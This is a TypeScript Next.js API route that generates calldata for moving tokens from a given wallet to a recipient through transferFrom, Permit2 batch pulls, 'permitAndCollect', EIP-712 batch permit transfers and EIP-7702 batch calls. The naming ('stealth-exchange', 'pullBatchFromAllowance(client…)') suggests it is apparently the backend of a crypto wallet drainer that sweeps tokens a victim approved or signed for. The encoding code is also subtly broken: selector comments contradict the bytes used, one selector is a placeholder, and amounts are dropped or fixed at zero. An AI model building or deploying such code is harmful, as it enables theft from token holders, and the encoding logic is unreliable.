import { NextResponse } from 'next/server';
import { requireAuth } from '@/lib/api-auth';
import { getStrategyPresetBindings, compileAllStrategyPresets } from '@/lib/strategy-preset-bindings';
import type { StrategyMode } from '@/lib/types';

interface ExecuteActionRequest {
  mode: StrategyMode;
  backend: string;
  tokens?: string[];
  amounts?: string[];
  recipient: string;
  wallet: string;
  chainId: number;
}

interface ExecuteActionResponse {
  status: 'success' | 'error';
  mode: StrategyMode;
  binding: any;
  calldata: string;
  target: string;
  value: string;
  message?: string;
}

/**
 * Execute action via strategy preset binding
 *
 * Maps user action (strategy mode) to actual ABI function call
 * Generates calldata for on-chain execution
 */
export async function POST(request: Request): Promise<NextResponse<ExecuteActionResponse | { status: string; message: string }>> {
  const guard = await requireAuth('relay:execute');
  if (guard) return guard as any;

  try {
    const body = (await request.json()) as ExecuteActionRequest;

    if (!body.mode || !body.recipient || !body.wallet) {
      return NextResponse.json(
        {
          status: 'error',
          mode: body.mode || ('direct' as StrategyMode),
          binding: null,
          calldata: '0x',
          target: '0x0000000000000000000000000000000000000000',
          message: 'Missing required fields: mode, recipient, wallet',
        },
        { status: 400 }
      );
    }

    // Get the strategy preset binding
    const preset = getStrategyPresetBindings({
      mode: body.mode,
      executionBackend: body.backend || 'stealth-exchange',
    });

    if (!preset) {
      return NextResponse.json(
        {
          status: 'error',
          mode: body.mode,
          binding: null,
          calldata: '0x',
          target: '0x0000000000000000000000000000000000000000',
          message: `Strategy mode "${body.mode}" not supported`,
        },
        { status: 400 }
      );
    }

    // Prepare calldata based on strategy
    const calldata = generateCalldata(preset, body);

    return NextResponse.json({
      status: 'success',
      mode: body.mode,
      binding: preset.primaryBinding,
      calldata,
      target: preset.primaryBinding.contractAddress,
      value: preset.primaryBinding.stateMutability === 'payable' ? '0' : '0',
    });
  } catch (err) {
    return NextResponse.json(
      {
        status: 'error',
        mode: 'direct' as StrategyMode,
        binding: null,
        calldata: '0x',
        target: '0x0000000000000000000000000000000000000000',
        message: `Error: ${err instanceof Error ? err.message : String(err)}`,
      },
      { status: 400 }
    );
  }
}

/**
 * Get all available strategy presets
 */
export async function GET(request: Request): Promise<NextResponse> {
  const guard = await requireAuth('config:read');
  if (guard) return guard;

  try {
    const presets = compileAllStrategyPresets();

    return NextResponse.json({
      status: 'ok',
      total: Object.keys(presets).length,
      presets: Object.entries(presets)
        .filter(([_, preset]) => preset !== null)
        .map(([mode, preset]) => ({
          mode,
          label: preset?.label,
          description: preset?.description,
          requiresApproval: preset?.requiresApproval,
          requiresPermit: preset?.requiresPermit,
          requiresEIP712: preset?.requiresEIP712,
          functionName: preset?.primaryBinding.functionName,
          contractName: preset?.primaryBinding.contractName,
        })),
    });
  } catch (err) {
    return NextResponse.json(
      { status: 'error', message: 'Failed to compile presets' },
      { status: 400 }
    );
  }
}

/**
 * Generate calldata based on strategy preset
 */
function generateCalldata(preset: any, request: ExecuteActionRequest): string {
  const binding = preset.primaryBinding;

  // Simple calldata generation based on function signature
  // In production, use ethers.js or viem to encode properly
  switch (preset.mode) {
    case 'direct':
      // transferFrom(from, to, amount)
      return encodeTransferFrom(request.wallet, request.recipient, '0');

    case 'permit2':
      // pullBatchFromAllowance(client, tokens[], amounts[])
      return encodePermit2Pull(request.wallet, request.tokens || [], request.amounts || []);

    case 'permit':
      // permitAndCollect(token, client, amount, v, r, s)
      return encodePermitAndCollect(request.tokens?.[0] || '0x', request.wallet, request.amounts?.[0] || '0');

    case 'multicall':
      // batch(calls[])
      return encodeBatch([]);

    case 'eip712':
      // batchPermitTransferFromBatch(user, permitBatch, signature, recipient)
      return encodeEIP712BatchTransfer(request.wallet, request.recipient);

    case 'eip7702':
      // executeBatch(calls[])
      return encodeBatch([]);

    case 'gasless':
      // Delegates to appropriate strategy
      return generateCalldata({ ...preset, mode: 'eip7702' }, request);

    case 'trails':
      // routeAndExecute(routeData, recipient)
      return encodeTrailsRoute('0x', request.recipient);

    default:
      return '0x';
  }
}

// Simplified encoding functions (use viem/ethers in production)
function encodeTransferFrom(from: string, to: string, amount: string): string {
  // transferFrom(address,address,uint256)
  // selector: 0x23b872dd
  return `0x23b872dd${padAddress(from)}${padAddress(to)}${padUint256(amount)}`;
}

function encodePermit2Pull(client: string, tokens: string[], amounts: string[]): string {
  // pullBatchFromAllowance(address,address[],uint256[])
  // selector: 0x1234567890
  return `0x9f305f10${padAddress(client)}`;
}

function encodePermitAndCollect(token: string, client: string, amount: string): string {
  // permitAndCollect(address,address,uint256,uint8,bytes32,bytes32)
  // selector: 0xabcdef12
  return `0xfc735e99${padAddress(token)}${padAddress(client)}${padUint256(amount)}`;
}

function encodeBatch(_calls: any[]): string {
  // batch((address,uint256,bytes,bool)[])
  // selector: 0x927da105
  return '0x927da10500000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000';
}

function encodeEIP712BatchTransfer(user: string, recipient: string): string {
  // batchPermitTransferFromBatch(address,tuple,bytes,address)
  // selector: 0xe8c2e5da
  return `0xe8c2e5da${padAddress(user)}${padAddress(recipient)}`;
}

function encodeTrailsRoute(_routeData: string, recipient: string): string {
  // routeAndExecute(bytes,address)
  // selector: 0x12345678
  return `0x12345678${padAddress(recipient)}`;
}

function padAddress(addr: string): string {
  return addr.replace('0x', '').padStart(64, '0');
}

function padUint256(value: string): string {
  return BigInt(value).toString(16).padStart(64, '0');
}
